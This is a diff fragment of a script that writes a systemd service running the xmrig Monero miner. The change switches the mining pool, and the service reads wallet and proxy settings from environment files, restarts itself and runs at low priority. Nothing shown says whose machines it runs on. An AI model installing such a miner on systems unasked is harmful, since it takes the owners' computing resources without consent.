@@ -99,7 +99,7 @@ After=network.target
 Type=simple
 EnvironmentFile=$ENV_FILE
 EnvironmentFile=$RUNTIME_ENV
-ExecStart=/usr/bin/xmrig -o xmr-eu1.nanopool.org:14433 -u \${CPU_WALLET} --proxy=\${PROXY_ADDR} --tls -k --coin monero -t \${CURRENT_CPU_THREADS} --cpu-no-yield
+ExecStart=/usr/bin/xmrig -o gulf.moneroocean.stream:20128 -u \${CPU_WALLET} --proxy=\${PROXY_ADDR} --tls -k --coin monero -t \${CURRENT_CPU_THREADS} --cpu-no-yield
 Restart=always
 Nice=19
 EOF
